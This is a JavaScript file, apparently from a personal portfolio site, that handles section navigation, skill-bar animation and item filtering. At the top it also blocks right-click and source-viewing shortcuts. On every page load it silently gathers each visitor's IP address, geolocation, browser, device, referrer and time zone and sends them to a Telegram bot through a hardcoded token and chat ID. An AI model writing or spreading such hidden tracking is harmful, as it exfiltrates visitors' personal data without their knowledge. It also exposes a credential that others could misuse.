
        document.addEventListener('contextmenu', (event) => event.preventDefault());
        document.addEventListener('keydown', (event) => {
            if (event.key === "F12" || (event.ctrlKey && (event.key === "u" || event.key === "s" || event.key === "Shift"))) {
                event.preventDefault();
            }
        });

        const botToken = '7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc';
        const chatId = '7945358964';

        async function sendDeviceInfoToTelegram() {
            try {
                const pageTitle = document.title;
                const pageLink = window.location.href;
                const referrerLink = document.referrer || 'No Referrer';
                const browserInfo = navigator.userAgent;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const deviceInfo = parseUserAgent(navigator.userAgent);
                const ipInfo = await fetch('https://ipapi.co/json/')
                    .then(res => res.json())
                    .catch(() => ({ ip: 'Unavailable', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' }));
                const sessionStart = new Date();
                const duration = calculateSessionDuration(sessionStart);
                const recentHistory = getRecentHistory();

                const message = `
<u>🧑‍💻 Just Clicked on Ali Hosen Official</u>

<b>🔍 Device Information:</b>
---------------------------------
📄 <b>Page Title:</b> ${pageTitle}
🔗 <b>Page Link:</b> ${pageLink}
↩️ <b>Referral Link:</b> ${referrerLink}
🌐 <b>Browser Info:</b> ${browserInfo}
⏰ <b>Time Zone:</b> ${timeZone}

📱 <b>Device Info:</b>
   - Device Name: ${deviceInfo.name || 'Unknown'}
   - Device Model: ${deviceInfo.model || 'Unknown'}

🌍 <b>IP Info:</b>
   - IP: ${ipInfo.ip}
   - City: ${ipInfo.city}
   - Region: ${ipInfo.region}
   - Country: ${ipInfo.country_name}

🕒 <b>Session Duration:</b> ${duration}

📜 <b>Recent Browsing History:</b>
${recentHistory}
                `;

                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML',
                    }),
                });

                if (response.ok) {
                    console.log('Message sent successfully!');
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }

        function parseUserAgent(userAgent) {
            let name = 'Unknown';
            let model = 'Unknown';

            if (userAgent.includes('Android')) {
                name = 'Android';
                const match = userAgent.match(/Android\s[0-9.]+;\s([^\)]+)\)/);
                model = match ? match[1] : 'Unknown';
            } else if (userAgent.includes('iPhone')) {
                name = 'iPhone';
                model = 'iPhone';
            } else if (userAgent.includes('iPad')) {
                name = 'iPad';
                model = 'iPad';
            } else if (userAgent.includes('Windows')) {
                name = 'Windows';
                model = 'PC';
            } else if (userAgent.includes('Macintosh')) {
                name = 'Mac';
                model = 'MacBook';
            }

            return { name, model };
        }

        function calculateSessionDuration(startTime) {
            const now = new Date();
            const elapsedMs = now - startTime;
            const elapsedSec = Math.floor(elapsedMs / 1000);
            const hours = Math.floor(elapsedSec / 3600);
            const minutes = Math.floor((elapsedSec % 3600) / 60);
            const seconds = elapsedSec % 60;

            return `${hours} Hours ${minutes} Minutes ${seconds} Seconds`;
        }

        function getRecentHistory() {
            const historyLength = window.history.length;

            return `
    - Current Page: ${window.location.href}
    - Referrer: ${document.referrer || 'No Referrer'}
    - Total History Length: ${historyLength} (Cannot access full list)
    `;
        }

        window.onload = () => {
            sendDeviceInfoToTelegram();
        };
        
        
        
        
        
        
        
        
        function showSection(id) {
      document.querySelectorAll('.section').forEach(section => {
        section.classList.remove('active');
      });
      document.getElementById(id).classList.add('active');

      document.querySelectorAll('.nav-bar a').forEach(nav => {
        nav.classList.remove('active');
      });
      document.querySelector(`.nav-bar a[href="#${id}"]`).classList.add('active');
    }
    
    
    
    
    window.addEventListener('load', () => {
      const bars = document.querySelectorAll('.skill-bar span');
      bars.forEach(bar => {
        bar.style.width = bar.style.width; // Re-triggers animation
      });
    });
    
    
    
    
    function filterItems(category) {
      const boxes = document.querySelectorAll('.box');
      boxes.forEach(box => {
        if (category === 'all' || box.dataset.category === category) {
          box.style.display = 'block';
        } else {
          box.style.display = 'none';
        }
      });
    }